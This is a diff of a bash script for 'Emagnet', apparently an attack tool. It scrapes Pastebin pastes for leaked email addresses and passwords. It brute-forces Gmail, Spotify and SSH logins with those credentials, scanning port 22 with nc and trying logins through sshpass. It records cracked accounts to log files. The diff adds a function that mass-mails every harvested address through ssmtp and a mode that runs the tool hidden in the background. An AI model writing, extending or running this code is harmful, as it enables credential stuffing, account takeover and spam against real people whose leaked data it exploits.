@@ -216,6 +216,14 @@ emagnet_license() {
   printf "%s\n" "Thank you.."
 }
 
+emagnet_quiet() {
+  conf
+  check4all
+  pid="$(ps aux |grep emagnet)"
+  screen -S "emagnet" -dm bash "$basename$0" --emagnet
+  printf "[\e[1;32m>>\e[0m] - Emagnet has been started in background (pid:$(ps aux|grep "SCREEN -dmS emagnet"|awk '{print $2}'|head -n1))\n"
+}
+
 noticeaboutscraping() {
    clear
    banner
@@ -397,42 +405,45 @@ temp_cnt=${wait_time}
 
 countdown() {
     conf
-if [[ "${GBRUTEFORCE}" = "true" ]]; then
+if [[ "$GBRUTEFORCE" = "true" ]]; then
       sed -i '118d' "$CONF"
       sed -i '118 i GBRUTEFORCE=true' "$CONF"
       sed -i '119d' "$CONF"
       sed -i '119 i SBRUTEFORCE=false' "$CONF"
       sed -i '120d' "$CONF"
       sed -i '120 i PBRUTEFORCE=false' "$CONF"
-      conf
-      printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-      printf "\n%64s \n" | tr ' ' '='
-      echo
+        conf
+          printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+          printf "\n%64s \n" | tr ' ' '='
+          echo
       analyzer
-elif [[ "${PBRUTEFORCE}" = "true" ]]; then
+
+elif [[ "$PBRUTEFORCE" = "true" ]]; then
       sed -i '118d' "$CONF"
       sed -i '118 i GBRUTEFORCE=false' "$CONF"
       sed -i '119d' "$CONF"
       sed -i '119 i SBRUTEFORCE=false' "$CONF"
       sed -i '120d' "$CONF"
       sed -i '120 i PBRUTEFORCE=true' "$CONF"
-      conf
-      printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-      printf "\n%64s \n" | tr ' ' '='
-      echo
+        conf
+          printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+          printf "\n%64s \n" | tr ' ' '='
+          echo
       analyzer
-elif [[ "${SBRUTEFORCE}" = "true" ]]; then
+
+elif [[ "$SBRUTEFORCE" = "true" ]]; then
       sed -i '118d' "$CONF"
       sed -i '118 i GBRUTEFORCE=false' "$CONF"
       sed -i '119d' "$CONF"
       sed -i '119 i SBRUTEFORCE=true' "$CONF"
       sed -i '120d' "$CONF"
       sed -i '120 i PBRUTEFORCE=false' "$CONF"
-      conf
-      printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-      printf "\n%64s \n" | tr ' ' '='
-      echo
+        conf
+          printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+          printf "\n%64s \n" | tr ' ' '='
+          echo
       analyzer
+
 else
       sed -i '118d' "$CONF"
       sed -i '118 i GBRUTEFORCE=false' "$CONF"	
@@ -440,7 +451,7 @@ else
       sed -i '119 i SBRUTEFORCE=false' "$CONF"
       sed -i '120d' "$CONF"
       sed -i '120 i PBRUTEFORCE=false' "$CONF"
-      conf
+        conf
       analyzer
 fi
 }
@@ -519,7 +530,7 @@ else
       printf "Please use (CTRL+C) to abort the scan at anytime................\n"
       printf "%64s\n" | tr ' ' '='
      sleep 2
-parallel -j$THREADS -a /tmp/.emagnet-portscan '\
+parallel -j${THREADS} -a /tmp/.emagnet-portscan '\
 timeout 0.5 nc -n -zv {} 22 > /dev/null 2>&1 |tee /tmp/.emagnet-sshbruter.txt 2>&1 grep open && \
 timeout 1 sshpass -p "$SSHPASS" ssh -v "-o StrictHostKeyChecking=no" $SSHUSER@{} pwd 2>&1 grep "Authenticated to" &> /dev/null
 
@@ -538,7 +549,7 @@ fi
 #echo -e "[\e[1;32mopen..\e[0m] - {}:22" || \
 #echo -e "[\e[1;31mclosed\e[0m] - {}:22"' 
 fi
-    rm "$SSHPORTSCAN" "$SSHTARGETS" "grep" "open" &> /dev/null
+    rm "$SSHPORTSCAN" "$SSHTARGETS" "./grep" "./open" &> /dev/null
     sleep 4
 }
 
@@ -552,73 +563,114 @@ mail="$(echo $line | cut -d: -f1)"
 password="$(echo $line | cut -d: -f2)"
 if [[ -z "$attack" ]]; then
     printf "[-] Wrong Password For $mail: \e[1;31m$password\e[0m\n"
-    echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> $EMAGNETLOGS/failed-to-crack.txt
+    echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> "$EMAGNETLOGS/failed-to-crack.txt"
 fi
 if [[ -n "$attack" ]]; then
     echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
     read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
-    echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
-    echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
-    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
-    echo -e "[+] Username: $mail"                                                  >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
-    echo -e "[+] Password: $password"                                              >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
-    echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
+    echo -e "================================================================"     >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
+    echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
+    echo -e "[+]------------------------------------------------------------"      >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
+    echo -e "[+] Username: $mail"                                                  >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
+    echo -e "[+] Password: $password"                                              >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
+    echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
 fi
-done < /tmp/.emagnet-passwords.txt
-    rm /tmp/.emagnet-passwords.txt
+done < "/tmp/.emagnet-passwords.txt"
+    rm "/tmp/.emagnet-passwords.txt" &> /dev/null
     sleep 3
 else
     sleep 1
 fi
 }
 
-emagnetsyntax() {
+emagnet_spammer() {
+ssmtp &> /dev/null
+if [[ "$?" -gt "0" ]]; then
+    printf "%s\n" "$basename$0: internal error -- ssmtp is required to be installed"
+    exit 1
+fi
+
+if [[ -z "$EMAIL2SEND" ]]; then
+    printf "%s\n" " - You must create a text file with the text you want to send"
+    printf "%s\n" " - to all targets, when text file has been created then you must"
+    printf "%s\n\n" " - set ~/textfile file in $CONF under EMAIL2SEND"
+    exit 1
+fi
+
+if ! [[ -f "$EMAIL2SEND" ]]; then
+    printf "%s\n\n" "$basename$0: internal error -- can't find $EMAIL2SEND, aborted..\n\n"
+    exit 1
+fi
+
+if [[ "$(ls $EMAGNETDB|wc -l)" -eq "0" ]]; then
+    echo -e "$basename$0: internal error -- no email addresses has been found, nothing to do, exiting.."
+    exit 1
+else
+    NRTARGETS="$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2|wc -l)"
+        printf "%24s \e[1;31mTargets: \e[1;32m$NRTARGETS\e[0m\e[0m\n\n"
+        read -p "- Do you want to send an email to all targets (yes/NO): " sendtoall
+             case $sendtoall in
+                  "yes") 
+                          printf "%62s \n" | tr ' ' '='
+                          grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > /tmp/.emagnet-spam
+                          while read e1; do 
+                                printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]" | tr ' ' '.' 
+                          done < "/tmp/.emagnet-spam"
+                                rm "/tmp/.emagnet-spam" &> /dev/null 
+                          ;;
+                  "*") 
+                          echo -e "- Aborted..\n"
+                          exit 1 
+                          ;;
+    esac
+fi
+}
+emagnet_syntax() {
 		if [[ -z $USERAGENT ]]; then
 			echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
-			exit
+			exit 1
      	fi
 
-curl -H "$USERAGENT" -Ls $PASTEBIN|grep -q "blocked your IP"
+curl -H "$USERAGENT" -Ls "$PASTEBIN"|grep -q "blocked your IP"
 if [[ $? = "0" ]]; then
- if [[ $VPN = "true" ]]; then
+ if [[ "$VPN" = "true" ]]; then
       banned
  else
-      clear; banner
       echo -e "[\e[1;31m<<\e[0m] - You have been blocked by pastebin"
       echo -e "[\e[1;31m<<\e[0m] - Enable a vpn or please try again later, aborted\n"
       exit 1
  fi
 fi
-      curl -Ls https://pastebin.com/languages \
-      |grep -o 'href="/archive/............' \
-      |cut -d'<' -f1 \
-      |cut -d'/' -f3 \
-      |cut -d'"' -f1 > /tmp/.emagnet-syntaxes
+     curl -Ls https://pastebin.com/languages \
+    |grep -o 'href="/archive/............' \
+    |cut -d'<' -f1 \
+    |cut -d'/' -f3 \
+    |cut -d'"' -f1 > /tmp/.emagnet-syntaxes
 
-read -p "Syntax (ex: python): " SYNTAX2DL
-if [[ -z $SYNTAX2DL ]]; then
+read -p "Syntax (ex: python): " "SYNTAX2DL"
+if [[ -z "$SYNTAX2DL" ]]; then
       echo -e "$basename$0: internal error -- you must choose a syntax language to download, aborted.."
       exit 1
 fi
 
-curl -Ls $PASTEBIN/$SYNTAX2DL \
+curl -Ls "$PASTEBIN/$SYNTAX2DL" \
 |grep -o '<a href="/........' \
 |cut -d'/' -f2 \
-|grep -E '[0-9]{1,4}' > /tmp/.emagnet-syntaxes-urls
+|grep -E '[0-9]{1,4}' > "/tmp/.emagnet-syntaxes-urls"
 
-grep -q "$SYNTAX2DL" /tmp/.emagnet-syntaxes
+grep -q "$SYNTAX2DL" "/tmp/.emagnet-syntaxes"
 
 if [[ "$?" = "0" ]]; then
      printf "Downloading $(cat /tmp/.emagnet-syntaxes-urls|wc -l) ${SYNTAX2DL} files.."
      mkdir -p "$EMAGNETSYNTAX/$SYNTAX2DL"
      cat /tmp/.emagnet-syntaxes-urls|xargs -P $THREADS wget -nc -q -P "$EMAGNETSYNTAX/$SYNTAX2DL" &> /dev/null
      printf "\nDone.\n\n" | tr ' ' '.'
-     rm /tmp/.emagnet-syntaxes-urls /tmp/.emagnet-syntaxes &> /dev/null
+     rm "/tmp/.emagnet-syntaxes-urls" "/tmp/.emagnet-syntaxes" &> /dev/null
 else
       echo -e "$basename$0: internal error -- $SYNTAX2DL is not a valid syntax language..\n"
       echo -e "try 'cat /tmp/.emagnet-syntaxes' for find valid syntaxes"
       exit 1
-      rm /tmp/.emagnet-syntaxes-urls /tmp/.emagnet-syntaxes &> /dev/null
+      rm "/tmp/.emagnet-syntaxes-urls" "/tmp/.emagnet-syntaxes" &> /dev/null
 fi
 }
 
@@ -627,23 +679,23 @@ emagnet2() {
 				echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
 				exit
          	fi
-curl -H "$USERAGENT" -Ls $PASTEBIN/archive \
+curl -H "$USERAGENT" -Ls "$PASTEBIN/archive" \
 |awk -F'href="/' '{print $2}' \
 |cut -d'"' -f1 \
 |awk 'length($0)>6 && length($0)<9' \
 |grep -v 'archive\|contact\|settings\|messages\|signup\|index.html' \
 |awk '{print tolower($0)}' > /tmp/.emagnet1
- ls -1 $EMAGNETALL \
+ ls -1 "$EMAGNETALL" \
 |sort > 1
- cat /tmp/.emagnet1 \
+ cat "/tmp/.emagnet1" \
 |sort \
 |cut -d/ -f5 > 2
  grep  -v -x -F -f 1 2  \
 |awk -F, '!seen[$1]++' \
 |sed "s/^/https:\/\/pastebin.com\/raw\//g" > /tmp/.emagnet
-rm 1 2 &> /dev/null
+rm "./1" "./2" &> /dev/null
 
-if [[ $(cat /tmp/.emagnet1|wc -l) = "8" ]]; then
+if [[ "$(cat /tmp/.emagnet1|wc -l)" = "8" ]]; then
      noticeaboutscraping
 fi
 
@@ -653,18 +705,18 @@ if [[ "$(cat /tmp/.emagnet1|grep https)" = "0" ]]; then
   Iwasbanned
 fi
 
-cat /tmp/.emagnet \
-|xargs -P $THREADS wget -q -nc -P $EMAGNETTEMP &> /dev/null
+cat "/tmp/.emagnet" \
+|xargs -P "$THREADS" wget -q -nc -P "$EMAGNETTEMP" &> /dev/null
 
-# Cause bash is bash
+# Cause bash is bash :)
 tt="$(cat /tmp/.emagnet| wc -l)"
-  if [[ $tt -lt "10" ]]; then 
+  if [[ "$tt" -lt "10" ]]; then 
       tt="0$tt"
   fi
 
 if [[ "${tt}" -eq "00" ]]; then 
-  curl -Ls $PASTEBIN|grep -q "blocked"
-    if [[ $? = "0" ]]; then
+  curl -Ls "$PASTEBIN"|grep -q "blocked"
+    if [[ "$?" = "0" ]]; then
       heavyload
       Iwasbanned
     fi
@@ -675,8 +727,8 @@ printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m
       clear
       banner
 else 
-echo -e "\n======================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n======================================"  >> $EMAGNETLOGS/pastebin-urls.txt
-     cat /tmp/.emagnet >> $EMAGNETLOGS/pastebin-urls.txt
+echo -e "\n======================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n======================================"  >> "$EMAGNETLOGS/pastebin-urls.txt"
+     cat "/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
 fi
 
 #### REGEX FOR MAIL ONLY
@@ -692,20 +744,20 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
     ((10#0$it > 00))
     ((10#0$pt > 00))
 
-if [[ ${pt} -gt "0" ]] && [[ ${it} -gt "0" ]]; then
-    echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found: ${pt} passwords from: $EMAGNETPW/${i##*/}" | xargs >> $EMAGNETLOGS/emagnet.log
-    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP \
+if [[ "$pt" -gt "0" ]] && [[ $"it" -gt "0" ]]; then
+    echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found: ${pt} passwords from: $EMAGNETPW/${i##*/}" | xargs >> "$EMAGNETLOGS/emagnet.log"
+    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP" \
     |awk '{print $1}'\
     |cut -d':' -f2,3\
     |cut -d'|' -f1\
     |uniq \
     |uniq \
     |grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\|'index.html'\|'alerts'\| \
-    |grep -v '/' >> $EMAGNETLOGS/passwords-from-pastebin.txt 
+    |grep -v '/' >> "$EMAGNETLOGS/passwords-from-pastebin.txt" 
     
-    grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP \
+    grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP" \
     |cut -d':' -f2 \
-    |uniq >> $EMAGNETLOGS/emails-from-pastebin.txt
+    |uniq >> "$EMAGNETLOGS/emails-from-pastebin.txt"
 
     printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
     printf "%19s[\e[1;32m$pt\e[0m] - Passwords Found\n\n"
@@ -714,8 +766,8 @@ if [[ ${pt} -gt "0" ]] && [[ ${it} -gt "0" ]]; then
 if [[ $NOTIFY = "true" ]]; then
     notify-send "Emagnet" "\n$tt - Files downloaded\n $pt - Passwords found\n$it - Email addresses found"
 fi
-      cp -rn ${p} $EMAGNETPW/ &> /dev/null
-      cp -rn ${i} "$EMAGNETDB/" &> /dev/null
+      cp -rn "$p" "$EMAGNETPW/" &> /dev/null
+      cp -rn "$i" "$EMAGNETDB/" &> /dev/null
       sleep 2
 
 if [[ "$GBRUTEFORCE" = "true" ]]; then
@@ -738,29 +790,29 @@ else
 fi
 
 # When we found email addresses without any password then we only echo email files
-cp -rn $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
-    elif [[ $pt = "00" ]] && [[ $it -gt "00" ]]; then
-         echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found \e[1;36m$it\e[0m emails from $EMAGNETDB/${i##*/}"|xargs >> $EMAGNETLOGS/emagnet.log
-         grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|cut -d':' -f2 \|uniq >> $EMAGNETLOGS/emails-from-pastebin.txt
+cp -rn "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
+    elif [[ "$pt" = "00" ]] && [[ "$it" -gt "00" ]]; then
+         echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found \e[1;36m$it\e[0m emails from $EMAGNETDB/${i##*/}"|xargs >> "$EMAGNETLOGS/emagnet.log"
+         grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP"|cut -d':' -f2 \|uniq >> "$EMAGNETLOGS/emails-from-pastebin.txt"
          sleep 2
          # Now copy them to email-files path
-         cp $i $EMAGNETDB/ &> /dev/null;
+         cp "$i" "$EMAGNETDB/" &> /dev/null;
                     
-                    if [[ $SBRUTEFORCE = "true" ]]; then
-                          cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
-                    elif [[ $GBRUTEFORCE = "true" ]]; then
-                          cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
-                    elif [[ $PBRUTEFORCE = "true" ]]; then
-                          cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
+                    if [[ "$SBRUTEFORCE" = "true" ]]; then
+                          cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
+                    elif [[ "$GBRUTEFORCE" = "true" ]]; then
+                          cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
+                    elif [[ "$PBRUTEFORCE" = "true" ]]; then
+                          cp -rn "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
                     else
-                          mv $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
+                          mv "$EMAGNETTEMP/*" "$EMAGNETALL" &> /dev/null
                     fi
 
         printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
         printf "%19s[\e[1;31m00\e[0m] - Passwords Found\n\n"
         printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"
 
-            if [[ $NOTIFY = "true" ]]; then
+            if [[ "$NOTIFY" = "true" ]]; then
                    notify-send "Emagnet" "\n$tt - Files downloaded\n 00 - Passwords found\n$it - Email addresses found"
             fi
                    sleep 5
@@ -774,15 +826,15 @@ else
             fi
                sleep 3.2
 fi
-               pkill -9 notify-send &> /dev/null
+               pkill -9 "notify-send" &> /dev/null
                rm "/tmp/.emagnet*" &> /dev/null
 }
 
 dontstopwhenfound() {
 conf
-curl -sL $PASTEBIN|grep -q "blocked your IP"
+curl -sL "$PASTEBIN"|grep -q "blocked your IP"
 if [[ $? = "0" ]]; then 
-   if [[ $VPN = "true" ]]; then 
+   if [[ "$VPN" = "true" ]]; then 
        banned
     else
        Iwasbanned
@@ -792,10 +844,10 @@ fi
 for (( ; ; )); do 
   conf
   countdown
-  clear
-  banner
+    clear
+    banner
   analyz
-  clear
+    clear
   banner
   emagnet2
   conf
@@ -965,14 +1017,30 @@ else
 fi 
 ;;
 
-"-i"|"--ip"|"-ip"|"ip") curl https://nr1.nu/i/ ;;
-"-h"|"--help"|"-help"|"help") usage ;;
-"-l"|"-license"|"--license") emagnet_license ;;
+"-i"|"--ip"|"-ip"|"ip") echo -e "iPV4: $(curl -s https://nr1.nu/i/)"                                     ;;
+
+"-h"|"--help"|"-help"|"help") usage                                                                      ;;
+
+"-l"|"-license"|"--license") emagnet_license                                                             ;;
+
 "-m"|"-move"|"--move") conf;check4all;moveem                                                             ;;
-"-s"|"-spam"|"--spam") conf;check4all;emagnetspammer                                                     ;;
-"-x"|"-syntax"|"--syntax") conf;check4all;clear;banner;emagnetsyntax                                     ;;
-"-q"|"-quiet"|"--quiet") conf;check4all;pid="$(ps aux |grep emagnet)" rm -rf /tmp/screen;screen -S emagnet -dm bash emagnet --emagnet
-                         printf "[\e[1;32m>>\e[0m] - Emagnet has been started in background (pid:$(ps aux|grep "SCREEN -dmS emagnet"|awk '{print $2}'|head -n1))\n" ;;
+
+"-s"|"-spam"|"--spam") 
+   conf
+   check4all
+   emagnet_spammer                                                     
+   ;;
+
+"-x"|"-syntax"|"--syntax")
+   conf
+   check4all
+   clear
+   banner 
+   emagnet_syntax                                                                                       
+   ;;
+
+"-q"|"-quiet"|"--quiet") emagnet_quiet ;;
+
 "version"|"-version"|"--version"|"-V") printf "Emagnet Version: v$VERSION\n\n" 			 ;;
 
 "-t"|"-time"|"--time")
@@ -989,7 +1057,7 @@ if ! [[ $2 =~ $re ]] ; then
 fi
      sed -i '30d' "$CONF"
      sed -i "30 i TIME=$2" "$CONF"
-     printf "emagnet: config file has been updated -- time has been set to: $2 s\n"
+     printf "emagnet: config file has been updated -- time has been set to: $2 seconds\n"
      exit 1
 ;;
 
